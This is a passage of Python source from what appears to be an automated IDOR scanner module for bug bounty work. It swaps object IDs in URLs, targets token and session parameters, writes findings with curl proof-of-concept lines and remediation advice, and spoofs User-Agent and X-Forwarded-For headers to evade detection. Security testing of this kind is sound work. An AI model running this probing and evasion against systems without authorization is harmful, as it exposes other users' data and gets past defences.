                           comparison: Dict, sensitive: bool,
                           sensitive_items: List[str], technique: str):
        severity = 'Critical' if ep.resource_type in HIGH_VALUE_RESOURCES else 'High'
        f = Finding(
            module='idor',
            title=f'[{technique.upper()}] IDOR on "{ep.param_name}" — {ep.resource_type}',
            severity=severity,
            description=(
                f'## Insecure Direct Object Reference\n\n'
                f'**Technique:** {technique}  \n'
                f'**Parameter:** `{ep.param_name}`  \n'
                f'**Original ID:** `{ep.param_value}`  \n'
                f'**Tested ID:** `{tested_id}`  \n'
                f'**Resource Type:** {ep.resource_type}  \n'
                f'**HTTP Status:** {status}  \n\n'
                f'### Response Similarity\n'
                f'- Structure: {comparison.get("structure_similarity", 0):.0%}  \n'
                f'- Content: {comparison.get("content_similarity", 0):.0%}  \n'
                f'- Text: {comparison.get("text_similarity", 0):.0%}  \n\n'
                + (f'### Sensitive Data Detected\n`{", ".join(sensitive_items[:8])}`\n\n'
                   if sensitive else '') +
                '### Impact\nUnauthorized access to another user\'s data. '
                'Severity depends on resource type and exposed fields.\n\n'
                '### Remediation\nEnforce per-object authorization: verify the '
                'authenticated user owns the requested resource ID on every request.'
            ),
            evidence={
                'original_id': ep.param_value, 'tested_id': tested_id,
                'url': test_url, 'resource_type': ep.resource_type,
                'comparison': comparison, 'sensitive_items': sensitive_items,
            },
            poc=f'curl "{test_url}"',
            remediation=(
                'Implement object-level authorization on every endpoint. '
                'Replace sequential IDs with random UUIDs. '
                'Validate resource ownership server-side before returning data.'
            ),
            cvss_score=9.1 if severity == 'Critical' else 7.5,
            bounty_score=3000 if severity == 'Critical' else 2000,
            target=ep.url,
        )
        self.findings.append(f)
        self.add_finding(f)

    def _emit_injection_finding(self, ep: ResourceEndpoint, payload: str,
                                test_url: str, vuln_type: str,
                                severity: str, cvss: float, bounty: int):
        f = Finding(
            module='idor',
            title=f'[{vuln_type.upper()}] {vuln_type} via IDOR parameter "{ep.param_name}"',
            severity=severity,
            description=(
                f'## {vuln_type} via IDOR Parameter\n\n'
                f'**Parameter:** `{ep.param_name}`  \n'
                f'**Payload:** `{payload[:120]}`  \n\n'
                '### Impact\nID-bearing parameters often lack input validation, '
                'making them attractive injection targets in addition to IDOR.\n\n'
                '### Remediation\nValidate and sanitise all ID parameters; '
                'use parameterised queries; encode output.'
            ),
            evidence={'url': test_url, 'param': ep.param_name, 'payload': payload},
            poc=f'curl "{test_url}"',
            remediation='Validate all input; use parameterised queries and output encoding.',
            cvss_score=cvss, bounty_score=bounty, target=ep.url,
        )
        self.findings.append(f)
        self.add_finding(f)

    # ══════════════════════════════════════════════════════════════════════════
    #  Helpers
    # ══════════════════════════════════════════════════════════════════════════

    def _replace_id(self, url: str, param_name: Optional[str], new_value: str) -> str:
        """Replace a parameter value in URL — query string or path segment."""
        parsed = urlparse(url)
        qs     = parse_qs(parsed.query)

        if param_name and param_name in qs:
            qs[param_name] = [new_value]
            new_query = '&'.join(f'{k}={quote(v[0], safe="")}' for k, v in qs.items())
            return parsed._replace(query=new_query).geturl()

        # Replace last numeric path segment
        new_path = re.sub(r'(/)\d+(/|$)', lambda m: m.group(1) + new_value + m.group(2), parsed.path)
        return parsed._replace(path=new_path, query=parsed.query).geturl()

    def _evasion_headers(self) -> Dict[str, str]:
        """IDOR-Forge evasion: rotate UA, add dummy header (no delay here — BaseModule handles it)."""
        return {
            'User-Agent': random.choice(UA_POOL),
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.0.1',
        }

    def _build_patterns(self) -> List[IDORPattern]:
        return [
            IDORPattern(
                name='Sequential Numeric ID',
                pattern=r'[?&/](id|user_id|account_id|order_id|doc_id|file_id|invoice_id|payment_id|product_id)[=/](\d+)',
                test_strategy='sequential', severity='Critical', bounty_score=3000, confidence=0.95,
            ),
            IDORPattern(
                name='RESTful Object Reference',
                pattern=r'/api/v?\d*/(users|orders|documents|files|accounts|invoices|payments|products|items)/(\d+|[a-f0-9\-]{36})',
                test_strategy='rest', severity='Critical', bounty_score=3000, confidence=0.95,
            ),
            IDORPattern(
                name='UUID in Path',
                pattern=r'/([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})',
                test_strategy='uuid', severity='Medium', bounty_score=1000, confidence=0.6,
            ),
            IDORPattern(
                name='Token / API Key',
                pattern=r'[?&/](token|access_token|auth_token|api_key|session_id)[=/]([a-zA-Z0-9]{8,64})',
                test_strategy='token', severity='High', bounty_score=2000, confidence=0.8,
            ),
            IDORPattern(
                name='Hash-based ID',
                pattern=r'[?&/](hash|checksum|md5|sha)[=/]([a-f0-9]{8,64})',
                test_strategy='hash', severity='Medium', bounty_score=1200, confidence=0.5,
            ),
            IDORPattern(
                name='Numeric path segment',
                pattern=r'/(\d{1,10})(?:/|$|\?)',
                test_strategy='path_segment', severity='High', bounty_score=2000, confidence=0.8,
            ),
        ]
